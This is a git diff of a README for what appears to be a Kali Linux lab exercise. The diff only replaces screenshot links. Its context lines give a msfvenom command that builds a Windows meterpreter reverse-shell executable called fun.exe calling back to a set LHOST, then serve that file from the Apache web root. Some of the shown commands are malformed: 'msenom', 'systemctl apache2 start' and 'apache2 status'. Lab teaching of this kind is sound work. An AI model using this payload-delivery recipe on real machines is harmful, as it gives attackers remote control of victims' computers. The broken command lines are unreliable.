@@ -24,13 +24,16 @@ Open terminal and try execute some kali linux commands
 ## EXECUTION STEPS AND ITS OUTPUT:
 PROGRAM:
 Find the attackers ip address using ifconfig
-![image](https://github.com/user-attachments/assets/fb3b9d6f-d93d-4d9e-925f-2461acd7e49b)
+
+![WhatsApp Image 2025-04-23 at 13 53 13_d6ad3884](https://github.com/user-attachments/assets/a79f0188-1caa-4979-a2a6-9a235f400e13)
+
 Create a malicious executable file fun.exe using msenom command  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 copy the fun.exe into the apache /var/www/html folder
 Start apache server sudo systemctl apache2 start
 Check the status of apache2 sudo apache2 status
 ## output:
-![WhatsApp Image 2025-04-10 at 10 29 20_9439a8cb](https://github.com/user-attachments/assets/517e7e4b-7e35-420e-848d-c07266ebfa98)
+![WhatsApp Image 2025-04-23 at 20 20 57_a676b27d](https://github.com/user-attachments/assets/93ad7f48-74e4-46fd-a9d5-bbedb519c066)
+
 
 Invoke msfconsole:
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
